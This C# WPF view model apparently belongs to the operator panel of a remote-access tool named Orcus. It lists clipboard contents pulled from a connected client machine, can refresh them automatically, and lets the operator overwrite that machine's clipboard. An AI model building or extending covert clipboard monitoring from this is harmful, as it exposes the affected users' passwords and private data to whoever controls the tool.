using System.Collections.ObjectModel;
using System.Linq;
using System.Windows;
using Orcus.Administration.Commands.ClipboardManager;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.ClipboardManager;
using Orcus.Administration.ViewModels.ViewInterface;
using Orcus.Shared.Commands.ClipboardManager;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(19)]
    public class ClipboardManagerViewModel : CommandView
    {
        private bool _autoUpdate;
        private ObservableCollection<ClipboardEntryViewModel> _clipboardEntries;
        private ClipboardManagerCommand _clipboardManagerCommand;

        private RelayCommand _editClipboardCommand;
        private RelayCommand _getCurrentClipboardContentCommand;
        private ClipboardEntryViewModel _selectedClipboardEntry;

        public override string Name { get; } = (string) Application.Current.Resources["Clipboard"];
        public override Category Category { get; } = Category.Information;

        public ObservableCollection<ClipboardEntryViewModel> ClipboardEntries
        {
            get { return _clipboardEntries; }
            set { SetProperty(value, ref _clipboardEntries); }
        }

        public ClipboardEntryViewModel SelectedClipboardEntry
        {
            get { return _selectedClipboardEntry; }
            set { SetProperty(value, ref _selectedClipboardEntry); }
        }

        public bool AutoUpdate
        {
            get { return _autoUpdate; }
            set
            {
                if (SetProperty(value, ref _autoUpdate))
                    _clipboardManagerCommand.IsAutomaticallyUpdating = value;
            }
        }

        public RelayCommand GetCurrentClipboardContentCommand
        {
            get
            {
                return _getCurrentClipboardContentCommand ??
                       (_getCurrentClipboardContentCommand =
                           new RelayCommand(parameter => { _clipboardManagerCommand.GetCurrentClipboardContent(); }));
            }
        }

        public RelayCommand EditClipboardCommand
        {
            get
            {
                return _editClipboardCommand ?? (_editClipboardCommand = new RelayCommand(parameter =>
                {
                    var selectedEntry = SelectedClipboardEntry;
                    ClipboardData clipboardData;

                    if (selectedEntry?.ClipboardData != null &&
                        selectedEntry.ClipboardData.GetType() != typeof(ClipboardData))
                        clipboardData = selectedEntry.ClipboardData.Clone();
                    else
                        clipboardData = new StringClipboardData("", ClipboardFormat.Text);

                    var viewModel = new ClipboardManagerEditViewModel(clipboardData);
                    if (WindowServiceInterface.Current.OpenWindowServiceDialog(WindowService, viewModel) == true)
                        _clipboardManagerCommand.EditClipboard(viewModel.ClipboardData);
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _clipboardManagerCommand = clientController.Commander.GetCommand<ClipboardManagerCommand>();
            _clipboardManagerCommand.ClipboardContentReceived += ClipboardManagerCommandOnClipboardContentReceived;
        }

        public override void LoadView(bool loadData)
        {
            base.LoadView(loadData);
            ClipboardEntries = new ObservableCollection<ClipboardEntryViewModel>();
        }

        private void ClipboardManagerCommandOnClipboardContentReceived(object sender, ClipboardInfo clipboardInfo)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                var changeSelectedItem = SelectedClipboardEntry == ClipboardEntries.LastOrDefault();
                ClipboardEntryViewModel clipboardEntryViewModel;
                ClipboardEntries.Add(clipboardEntryViewModel = new ClipboardEntryViewModel(clipboardInfo));
                if (changeSelectedItem)
                    SelectedClipboardEntry = clipboardEntryViewModel;
            });
        }
    }
}